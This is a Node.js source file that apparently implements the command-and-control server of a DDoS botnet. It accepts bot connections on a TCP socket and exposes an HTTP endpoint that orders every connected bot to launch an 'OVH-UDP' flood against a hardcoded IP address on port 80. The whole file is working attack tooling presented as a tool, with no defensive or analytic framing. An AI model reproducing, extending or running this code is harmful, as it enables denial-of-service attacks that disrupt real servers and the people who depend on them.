const net = require("net")
const express = require("express")
const chalk = require("chalk")
const chalkGradient = require("gradient-string")
const chalkAnimation = require("chalk-animation")
const terminalLink = require("terminal-link")
const app = express()

const HTTP_PORT = 3000
const SOCKET_PORT = 7777
const SOCKET_HOST = "0.0.0.0"

/*************
 *  METHODS  *
 ************/

const METHODS = ["OVH-UDP"]

var clients = []

const sendAttack = (method, host, port, time) => {
    for (let client of clients) {
        client.write(`ATT|${method}|${host}|${port}|${time}`)
    }
}

console.log(
    chalk.italic(
        chalkGradient.fruit(
            "\n\n\n\n                                                      Loading...\n\n\n\n"
        )
    )
)

app.get("/", (req, res) => {
    let { method } = req.query
    if (!method) return res.status(404).send("method parameter not set")
    method = method.toUpperCase()

    if (!METHODS.includes(method))
        return res.status(404).send("method does not exist")
    sendAttack(method, "141.95.52.208", 80, 10)
    return res.send(`sent!`)
})

var server = net.createServer(function (socket) {
    const onLeave = () => {
        console.log(
            chalk.grey(
                `[${chalk.redBright("-")}] ${chalkGradient.rainbow(
                    `${socket.remoteAddress}:${socket.remotePort}`
                )} disconnected.`
            )
        )
        clients = clients.filter((client) => client !== socket)
    }

    socket.on("data", (data) => {
        console.log("Received: " + data)
        const dataStr = data.toString()
        if (dataStr === "servConn") {
            console.log(
                chalk.grey(
                    `[${chalk.greenBright("+")}] ${chalkGradient.rainbow(
                        `${socket.remoteAddress}:${socket.remotePort}`
                    )} connected.`
                )
            )
            clients.push(socket)
        }
    })
    socket.on("end", onLeave)

    socket.on("error", onLeave)
})

server.listen(SOCKET_PORT, SOCKET_HOST, () => {
    console.log(
        `${chalk.grey(
            `[${chalkGradient.retro(
                `SOCKET`
            )}] Listening on port ${chalk.magentaBright(SOCKET_PORT)}.`
        )}`
    )
})

app.listen(HTTP_PORT, () => {
    const link = terminalLink("[OPEN]", `http://localhost:${HTTP_PORT}`)
    console.log(
        `${chalk.grey(
            `[${chalkGradient.retro(
                `API`
            )}] Listening on port ${chalk.magentaBright(HTTP_PORT)}. ${link}`
        )}`
    )
})
